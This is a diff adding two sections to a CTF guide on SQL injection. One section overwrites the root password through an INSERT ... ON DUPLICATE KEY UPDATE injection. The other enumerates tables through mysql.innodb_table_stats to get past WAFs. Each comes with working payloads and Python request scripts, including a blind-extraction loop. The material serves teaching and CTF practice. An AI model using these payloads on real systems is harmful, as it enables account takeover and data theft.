@@ -22,6 +22,8 @@ Comprehensive SQL injection techniques for CTF challenges. For other server-side
 - [Host Header SQL Injection with PROCEDURE ANALYSE() (DefCamp 2017)](#host-header-sql-injection-with-procedure-analyse-defcamp-2017)
 - [SQLite Blind SQLi via randomblob() Timing (SECCON 2017)](#sqlite-blind-sqli-via-randomblob-timing-seccon-2017)
 - [vsprintf Double-Prepare Format String SQLi (AceBear 2018)](#vsprintf-double-prepare-format-string-sqli-acebear-2018)
+- [SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)](#sql-insert-on-duplicate-key-update-password-overwrite-midnight-sun-ctf-2018)
+- [MySQL innodb_table_stats as information_schema Alternative (N1CTF 2018)](#mysql-innodb_table_stats-as-information_schema-alternative-n1ctf-2018)
 
 ---
 
@@ -477,5 +479,97 @@ r = requests.post("http://target/login", data={
 ```
 
 **Key insight:** `%c` in `vsprintf` converts an integer to a character, bypassing string-level escaping. If user input passes through `vsprintf` twice (once for formatting, once for query building), format specifiers in the first input become SQL injection vectors in the second pass. The key trick is sending `39` as one parameter (ASCII code for single quote) and `%1$c` as another to reference that parameter as a character. Look for PHP code that chains `sprintf`/`vsprintf` with query construction.
+
+---
+
+### SQL INSERT ON DUPLICATE KEY UPDATE Password Overwrite (Midnight Sun CTF 2018)
+
+**Pattern:** When you can inject into an INSERT statement but SELECT is revoked, use MySQL's `ON DUPLICATE KEY UPDATE` clause to overwrite an existing user's password. The clause triggers when the INSERT would violate a UNIQUE constraint, updating the existing row instead.
+
+```sql
+-- Vulnerable INSERT:
+INSERT INTO users (id, username, password) VALUES ('', 'USER_INPUT', 'PASS_INPUT')
+
+-- Injection in username field:
+'),('','root','z')ON DUPLICATE KEY UPDATE password='l'#
+
+-- Resulting query:
+INSERT INTO users (id, username, password) VALUES ('', ''),('','root','z')ON DUPLICATE KEY UPDATE password='l'#', 'PASS_INPUT')
+-- This inserts a row for 'root' and when the UNIQUE constraint on username conflicts,
+-- it updates the existing root user's password to 'l'
+```
+
+```python
+import requests
+
+# Overwrite the root user's password via ON DUPLICATE KEY UPDATE
+payload_username = "'),('','root','z')ON DUPLICATE KEY UPDATE password='hacked'#"
+r = requests.post("http://target/register", data={
+    "username": payload_username,
+    "password": "anything"
+})
+
+# Now login as root with the overwritten password
+r = requests.post("http://target/login", data={
+    "username": "root",
+    "password": "hacked"
+})
+print(r.text)
+```
+
+**Key insight:** MySQL's `ON DUPLICATE KEY UPDATE` clause in INSERT statements can modify existing rows when a UNIQUE constraint conflicts, enabling password overwrite without SELECT privileges. This is particularly useful when the database user has INSERT but not SELECT permissions, making traditional UNION-based extraction impossible. Look for registration or user creation endpoints with injectable INSERT queries.
+
+---
+
+### MySQL innodb_table_stats as information_schema Alternative (N1CTF 2018)
+
+**Pattern:** When a WAF blocks access to `information_schema`, use `mysql.innodb_table_stats` to enumerate database and table names. This system table contains metadata about InnoDB tables and is often not included in WAF rules.
+
+```sql
+-- Direct query (if not blind):
+SELECT group_concat(table_name) FROM mysql.innodb_table_stats WHERE database_name=database()
+
+-- Also available:
+SELECT group_concat(database_name) FROM mysql.innodb_table_stats
+```
+
+```python
+# Boolean-based blind extraction via innodb_table_stats:
+import requests
+import string
+
+def blind_extract(url):
+    result = ""
+    for pos in range(1, 100):
+        found = False
+        for char in string.ascii_lowercase + string.digits + "_,":
+            payload = (
+                "'or(if(1,(select(substr((select(group_concat(table_name))"
+                f" from mysql.innodb_table_stats where database_name=database()),{pos},1))"
+                f"='{char}'),1)=1)#"
+            )
+            r = requests.post(url, data={"input": payload})
+            if "success" in r.text:  # adjust oracle condition
+                result += char
+                found = True
+                print(f"[+] Extracted so far: {result}")
+                break
+        if not found:
+            break
+    return result
+
+tables = blind_extract("http://target/search")
+print(f"Tables: {tables}")
+```
+
+**Other WAF-bypass metadata sources:**
+```sql
+-- mysql.innodb_table_stats: database_name, table_name
+-- mysql.innodb_index_stats: database_name, table_name, index_name
+-- sys.schema_table_statistics: table_schema, table_name (MySQL 5.7+)
+-- sys.x$schema_table_statistics: same, less formatting
+```
+
+**Key insight:** `mysql.innodb_table_stats` contains `database_name` and `table_name` columns, providing an alternative metadata source when `information_schema` access is filtered by WAF rules. Unlike `information_schema`, it only tracks InnoDB tables (not column names), so combine with error-based or blind techniques to discover column names after finding tables.
 
 ---
